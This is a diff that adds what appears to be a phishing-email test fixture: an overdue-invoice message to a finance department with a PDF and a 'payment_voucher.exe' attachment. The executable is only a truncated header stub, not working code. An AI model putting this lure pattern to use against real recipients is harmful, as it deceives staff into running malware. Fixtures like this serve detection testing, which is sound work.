@@ -1,0 +1,32 @@
+From: supplier-invoicing@logistics-fast.test
+To: finance-dept@company.test
+Subject: Overdue Payment Invoice #INV-88910
+Date: Fri, 23 Oct 2026 10:00:00 +0000
+Message-ID: <inv-88910@logistics-fast.test>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_Part_123_456789"
+
+------=_Part_123_456789
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 7bit
+
+Please find attached the outstanding invoice documentation for the October freight logistics.
+
+Thank you,
+Accounts Receivable
+
+------=_Part_123_456789
+Content-Type: application/pdf; name="invoice_october.pdf"
+Content-Disposition: attachment; filename="invoice_october.pdf"
+Content-Transfer-Encoding: base64
+
+JVBERi0xLjQKJcTl8uXrp/Og0MTGCjQgMCBvYmoKPDwgL0xlbmd0aCA1IDAgUiAvRmlsdGVyIC9G
+bGF0ZURlY29kZSA+PgpzdHJlYW0KeAEr5uUCAF24A3kKZW5kc3RyZWFtCmVuZG9iago=
+------=_Part_123_456789
+Content-Type: application/x-msdownload; name="payment_voucher.exe"
+Content-Disposition: attachment; filename="payment_voucher.exe"
+Content-Transfer-Encoding: base64
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAyAAAAA==
+------=_Part_123_456789--
